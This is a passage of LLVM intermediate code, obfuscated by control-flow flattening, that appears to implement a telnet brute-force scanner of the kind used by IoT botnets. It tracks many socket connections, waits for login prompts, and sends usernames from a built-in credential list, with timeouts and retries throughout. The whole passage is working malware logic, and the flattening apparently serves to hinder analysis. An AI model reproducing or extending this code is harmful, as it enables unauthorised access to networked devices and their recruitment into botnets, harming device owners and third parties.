  %277 = sdiv i32 %276, 64
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds [16 x i64], [16 x i64]* %271, i64 0, i64 %278
  %280 = load i64, i64* %279, align 8
  %281 = or i64 %280, %270
  store i64 %281, i64* %279, align 8
  %282 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %282, align 8
  %283 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %283, align 8
  %284 = load i32, i32* %2, align 4
  %285 = sext i32 %284 to i64
  %.reload310 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload310, i64 %285
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %286, i32 0, i32 0
  %288 = load i32, i32* %287, align 16
  %289 = add nsw i32 %288, 1
  %290 = call i32 @select(i32 %289, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %290, i32* %3, align 4
  %291 = load i32, i32* %3, align 4
  %292 = icmp eq i32 %291, 1
  %293 = select i1 %292, i32 -784926376, i32 972689383
  store i32 %293, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %295 = load i32, i32* %2, align 4
  %296 = sext i32 %295 to i64
  %.reload309 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload309, i64 %296
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %297, i32 0, i32 0
  %299 = load i32, i32* %298, align 16
  %300 = bitcast i32* %7 to i8*
  %301 = call i32 @getsockopt(i32 %299, i32 1, i32 4, i8* %300, i32* %6) #2
  %302 = load i32, i32* %7, align 4
  %303 = icmp ne i32 %302, 0
  %304 = select i1 %303, i32 -2015297145, i32 1999124819
  store i32 %304, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i32, i32* %2, align 4
  %307 = sext i32 %306 to i64
  %.reload308 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload308, i64 %307
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %308, i32 0, i32 0
  %310 = load i32, i32* %309, align 16
  %311 = call i32 @sclose(i32 %310)
  %312 = load i32, i32* %2, align 4
  %313 = sext i32 %312 to i64
  %.reload307 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload307, i64 %313
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %314, i32 0, i32 2
  store i8 0, i8* %315, align 8
  %316 = load i32, i32* %2, align 4
  %317 = sext i32 %316 to i64
  %.reload306 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload306, i64 %317
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %318, i32 0, i32 3
  store i8 1, i8* %319, align 1
  store i32 -897924417, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load i32, i32* %2, align 4
  %322 = sext i32 %321 to i64
  %.reload305 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload305, i64 %322
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %323, i32 0, i32 0
  %325 = load i32, i32* %324, align 16
  %326 = load i32, i32* %2, align 4
  %327 = sext i32 %326 to i64
  %.reload304 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload304, i64 %327
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %328, i32 0, i32 0
  %330 = load i32, i32* %329, align 16
  %331 = call i32 (i32, i32, ...) @fcntl(i32 %330, i32 3, i8* null)
  %332 = and i32 %331, -2049
  %333 = call i32 (i32, i32, ...) @fcntl(i32 %325, i32 4, i32 %332)
  %334 = load i32, i32* %2, align 4
  %335 = sext i32 %334 to i64
  %.reload303 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload303, i64 %335
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %336, i32 0, i32 6
  store i32 0, i32* %337, align 4
  %338 = load i32, i32* %2, align 4
  %339 = sext i32 %338 to i64
  %.reload302 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload302, i64 %339
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %340, i32 0, i32 7
  store i16 0, i16* %341, align 16
  %342 = load i32, i32* %2, align 4
  %343 = sext i32 %342 to i64
  %.reload301 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload301, i64 %343
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %344, i32 0, i32 8
  %346 = load i8*, i8** %345, align 8
  call void @llvm.memset.p0i8.i64(i8* %346, i8 0, i64 1024, i32 1, i1 false)
  %347 = load i32, i32* %2, align 4
  %348 = sext i32 %347 to i64
  %.reload300 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload300, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %349, i32 0, i32 2
  store i8 2, i8* %350, align 8
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  store i32 -300128556, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load i32, i32* %3, align 4
  %354 = icmp eq i32 %353, -1
  %355 = select i1 %354, i32 -1825633731, i32 1478650339
  store i32 %355, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  %357 = load i32, i32* %2, align 4
  %358 = sext i32 %357 to i64
  %.reload299 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload299, i64 %358
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %359, i32 0, i32 0
  %361 = load i32, i32* %360, align 16
  %362 = call i32 @sclose(i32 %361)
  %363 = load i32, i32* %2, align 4
  %364 = sext i32 %363 to i64
  %.reload298 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload298, i64 %364
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %365, i32 0, i32 2
  store i8 0, i8* %366, align 8
  %367 = load i32, i32* %2, align 4
  %368 = sext i32 %367 to i64
  %.reload297 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload297, i64 %368
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %369, i32 0, i32 3
  store i8 1, i8* %370, align 1
  store i32 1478650339, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  store i32 -300128556, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = load i32, i32* %2, align 4
  %374 = sext i32 %373 to i64
  %.reload296 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload296, i64 %374
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %375, i32 0, i32 6
  %377 = load i32, i32* %376, align 4
  %378 = add i32 %377, 10
  %379 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %380 = icmp ult i32 %378, %379
  %381 = select i1 %380, i32 107163902, i32 431012218
  store i32 %381, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* %2, align 4
  %384 = sext i32 %383 to i64
  %.reload295 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload295, i64 %384
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %385, i32 0, i32 0
  %387 = load i32, i32* %386, align 16
  %388 = call i32 @sclose(i32 %387)
  %389 = load i32, i32* %2, align 4
  %390 = sext i32 %389 to i64
  %.reload294 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload294, i64 %390
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %391, i32 0, i32 2
  store i8 0, i8* %392, align 8
  %393 = load i32, i32* %2, align 4
  %394 = sext i32 %393 to i64
  %.reload293 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload293, i64 %394
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %395, i32 0, i32 3
  store i8 1, i8* %396, align 1
  store i32 431012218, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  store i32 -2108438042, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i32, i32* %2, align 4
  %400 = sext i32 %399 to i64
  %.reload292 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload292, i64 %400
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %401, i32 0, i32 6
  %403 = load i32, i32* %402, align 4
  %404 = icmp eq i32 %403, 0
  %405 = select i1 %404, i32 -747617724, i32 327832469
  store i32 %405, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  %407 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %408 = load i32, i32* %2, align 4
  %409 = sext i32 %408 to i64
  %.reload291 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload291, i64 %409
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %410, i32 0, i32 6
  store i32 %407, i32* %411, align 4
  store i32 327832469, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load i32, i32* %2, align 4
  %414 = sext i32 %413 to i64
  %.reload290 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload290, i64 %414
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %415, i32 0, i32 0
  %417 = load i32, i32* %416, align 16
  %418 = load i32, i32* %2, align 4
  %419 = sext i32 %418 to i64
  %.reload289 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload289, i64 %419
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %420, i32 0, i32 8
  %422 = load i8*, i8** %421, align 8
  %423 = load i32, i32* %2, align 4
  %424 = sext i32 %423 to i64
  %.reload288 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload288, i64 %424
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %425, i32 0, i32 7
  %427 = load i16, i16* %426, align 16
  %428 = zext i16 %427 to i32
  %429 = call i32 @readUntil(i32 %417, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %422, i32 1024, i32 %428)
  %430 = icmp ne i32 %429, 0
  %431 = select i1 %430, i32 -2035785180, i32 -121335514
  store i32 %431, i32* %switchVar
  br label %loopEnd

; <label>:432:                                    ; preds = %loopEntry
  %433 = load i32, i32* %2, align 4
  %434 = sext i32 %433 to i64
  %.reload287 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload287, i64 %434
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %435, i32 0, i32 6
  store i32 0, i32* %436, align 4
  %437 = load i32, i32* %2, align 4
  %438 = sext i32 %437 to i64
  %.reload286 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload286, i64 %438
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %439, i32 0, i32 7
  store i16 0, i16* %440, align 16
  %441 = load i32, i32* %2, align 4
  %442 = sext i32 %441 to i64
  %.reload285 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload285, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 8
  %445 = load i8*, i8** %444, align 8
  %446 = call i8* @strstr(i8* %445, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %447 = icmp ne i8* %446, null
  %448 = select i1 %447, i32 509166835, i32 -32521631
  store i32 %448, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  %450 = load i32, i32* %2, align 4
  %451 = sext i32 %450 to i64
  %.reload284 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload284, i64 %451
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %452, i32 0, i32 2
  store i8 5, i8* %453, align 8
  store i32 353295657, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  %455 = load i32, i32* %2, align 4
  %456 = sext i32 %455 to i64
  %.reload283 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload283, i64 %456
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %457, i32 0, i32 2
  store i8 3, i8* %458, align 8
  store i32 353295657, i32* %switchVar
  br label %loopEnd

; <label>:459:                                    ; preds = %loopEntry
  %460 = load i32, i32* %2, align 4
  %461 = sext i32 %460 to i64
  %.reload282 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload282, i64 %461
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %462, i32 0, i32 8
  %464 = load i8*, i8** %463, align 8
  call void @llvm.memset.p0i8.i64(i8* %464, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:465:                                    ; preds = %loopEntry
  %466 = load i32, i32* %2, align 4
  %467 = sext i32 %466 to i64
  %.reload281 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload281, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 0
  %470 = load i32, i32* %469, align 16
  %471 = load i32, i32* %2, align 4
  %472 = sext i32 %471 to i64
  %.reload280 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload280, i64 %472
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %473, i32 0, i32 8
  %475 = load i8*, i8** %474, align 8
  %476 = load i32, i32* %2, align 4
  %477 = sext i32 %476 to i64
  %.reload279 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload279, i64 %477
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %478, i32 0, i32 7
  %480 = load i16, i16* %479, align 16
  %481 = zext i16 %480 to i32
  %482 = call i32 @readUntil(i32 %470, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.42, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %475, i32 1024, i32 %481)
  %483 = icmp ne i32 %482, 0
  %484 = select i1 %483, i32 1036458369, i32 1859626957
  store i32 %484, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  %486 = load i32, i32* %2, align 4
  %487 = sext i32 %486 to i64
  %.reload278 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload278, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 6
  store i32 0, i32* %489, align 4
  %490 = load i32, i32* %2, align 4
  %491 = sext i32 %490 to i64
  %.reload277 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload277, i64 %491
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %492, i32 0, i32 7
  store i16 0, i16* %493, align 16
  %494 = load i32, i32* %2, align 4
  %495 = sext i32 %494 to i64
  %.reload276 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload276, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 8
  %498 = load i8*, i8** %497, align 8
  %499 = call i8* @strstr(i8* %498, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %500 = icmp ne i8* %499, null
  %501 = select i1 %500, i32 1801469776, i32 -729884832
  store i32 %501, i32* %switchVar
  br label %loopEnd

; <label>:502:                                    ; preds = %loopEntry
  %503 = load i32, i32* %2, align 4
  %504 = sext i32 %503 to i64
  %.reload275 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload275, i64 %504
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %505, i32 0, i32 2
  store i8 5, i8* %506, align 8
  store i32 433858599, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  %508 = load i32, i32* %2, align 4
  %509 = sext i32 %508 to i64
  %.reload274 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload274, i64 %509
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %510, i32 0, i32 2
  store i8 3, i8* %511, align 8
  store i32 433858599, i32* %switchVar
  br label %loopEnd

; <label>:512:                                    ; preds = %loopEntry
  %513 = load i32, i32* %2, align 4
  %514 = sext i32 %513 to i64
  %.reload273 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload273, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 8
  %517 = load i8*, i8** %516, align 8
  call void @llvm.memset.p0i8.i64(i8* %517, i8 0, i64 1024, i32 1, i1 false)
  %518 = load i32, i32* %2, align 4
  %519 = sext i32 %518 to i64
  %.reload272 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload272, i64 %519
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %520, i32 0, i32 2
  store i8 3, i8* %521, align 8
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:522:                                    ; preds = %loopEntry
  %523 = load i32, i32* %2, align 4
  %524 = sext i32 %523 to i64
  %.reload271 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload271, i64 %524
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %525, i32 0, i32 8
  %527 = load i8*, i8** %526, align 8
  %528 = call i64 @strlen(i8* %527) #10
  %529 = trunc i64 %528 to i16
  %530 = load i32, i32* %2, align 4
  %531 = sext i32 %530 to i64
  %.reload270 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload270, i64 %531
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %532, i32 0, i32 7
  store i16 %529, i16* %533, align 16
  store i32 633253818, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  store i32 -855891179, i32* %switchVar
  br label %loopEnd

; <label>:535:                                    ; preds = %loopEntry
  %536 = load i32, i32* %2, align 4
  %537 = sext i32 %536 to i64
  %.reload269 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload269, i64 %537
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %538, i32 0, i32 6
  %540 = load i32, i32* %539, align 4
  %541 = add i32 %540, 10
  %542 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %543 = icmp ult i32 %541, %542
  %544 = select i1 %543, i32 -1592514784, i32 1841190443
  store i32 %544, i32* %switchVar
  br label %loopEnd

; <label>:545:                                    ; preds = %loopEntry
  %546 = load i32, i32* %2, align 4
  %547 = sext i32 %546 to i64
  %.reload268 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload268, i64 %547
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %548, i32 0, i32 0
  %550 = load i32, i32* %549, align 16
  %551 = call i32 @sclose(i32 %550)
  %552 = load i32, i32* %2, align 4
  %553 = sext i32 %552 to i64
  %.reload267 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload267, i64 %553
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %554, i32 0, i32 2
  store i8 0, i8* %555, align 8
  %556 = load i32, i32* %2, align 4
  %557 = sext i32 %556 to i64
  %.reload266 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload266, i64 %557
  %559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %558, i32 0, i32 3
  store i8 1, i8* %559, align 1
  store i32 1841190443, i32* %switchVar
  br label %loopEnd

; <label>:560:                                    ; preds = %loopEntry
  store i32 -2108438042, i32* %switchVar
  br label %loopEnd

; <label>:561:                                    ; preds = %loopEntry
  %562 = load i32, i32* %2, align 4
  %563 = sext i32 %562 to i64
  %.reload265 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload265, i64 %563
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %564, i32 0, i32 0
  %566 = load i32, i32* %565, align 16
  %567 = load i32, i32* %2, align 4
  %568 = sext i32 %567 to i64
  %.reload264 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload264, i64 %568
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %569, i32 0, i32 4
  %571 = load i8, i8* %570, align 2
  %572 = zext i8 %571 to i64
  %573 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %572
  %574 = load i8*, i8** %573, align 8
  %575 = load i32, i32* %2, align 4
  %576 = sext i32 %575 to i64
  %.reload263 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload263, i64 %576
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %577, i32 0, i32 4
  %579 = load i8, i8* %578, align 2
  %580 = zext i8 %579 to i64
  %581 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %580
  %582 = load i8*, i8** %581, align 8
  %583 = call i64 @strlen(i8* %582) #10
  %584 = call i64 @send(i32 %566, i8* %574, i64 %583, i32 16384)
  %585 = icmp slt i64 %584, 0
  %586 = select i1 %585, i32 842071653, i32 -73210649
  store i32 %586, i32* %switchVar
  br label %loopEnd

; <label>:587:                                    ; preds = %loopEntry
  %588 = load i32, i32* %2, align 4
  %589 = sext i32 %588 to i64
  %.reload262 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload262, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 0
  %592 = load i32, i32* %591, align 16
  %593 = call i32 @sclose(i32 %592)
  %594 = load i32, i32* %2, align 4
  %595 = sext i32 %594 to i64
  %.reload261 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload261, i64 %595
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %596, i32 0, i32 2
  store i8 0, i8* %597, align 8
  %598 = load i32, i32* %2, align 4
  %599 = sext i32 %598 to i64
  %.reload260 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload260, i64 %599
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %600, i32 0, i32 3
  store i8 1, i8* %601, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:602:                                    ; preds = %loopEntry
  %603 = load i32, i32* %2, align 4
  %604 = sext i32 %603 to i64
  %.reload259 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload259, i64 %604
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %605, i32 0, i32 0
  %607 = load i32, i32* %606, align 16
  %608 = call i64 @send(i32 %607, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %609 = icmp slt i64 %608, 0
  %610 = select i1 %609, i32 -841483346, i32 1061091644
  store i32 %610, i32* %switchVar
  br label %loopEnd

; <label>:611:                                    ; preds = %loopEntry
  %612 = load i32, i32* %2, align 4
  %613 = sext i32 %612 to i64
  %.reload258 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload258, i64 %613
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %614, i32 0, i32 0
  %616 = load i32, i32* %615, align 16
  %617 = call i32 @sclose(i32 %616)
  %618 = load i32, i32* %2, align 4
  %619 = sext i32 %618 to i64
  %.reload257 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload257, i64 %619
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %620, i32 0, i32 2
  store i8 0, i8* %621, align 8
  %622 = load i32, i32* %2, align 4
  %623 = sext i32 %622 to i64
  %.reload256 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload256, i64 %623
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %624, i32 0, i32 3
  store i8 1, i8* %625, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  %627 = load i32, i32* %2, align 4
  %628 = sext i32 %627 to i64
  %.reload255 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload255, i64 %628
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %629, i32 0, i32 2
  store i8 4, i8* %630, align 8
  store i32 -2108438042, i32* %switchVar
  br label %loopEnd

; <label>:631:                                    ; preds = %loopEntry
  %632 = load i32, i32* %2, align 4
  %633 = sext i32 %632 to i64
  %.reload254 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload254, i64 %633
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %634, i32 0, i32 6
  %636 = load i32, i32* %635, align 4
  %637 = icmp eq i32 %636, 0
  %638 = select i1 %637, i32 -585844999, i32 -1282484026
  store i32 %638, i32* %switchVar
  br label %loopEnd

; <label>:639:                                    ; preds = %loopEntry
  %640 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %641 = load i32, i32* %2, align 4
  %642 = sext i32 %641 to i64
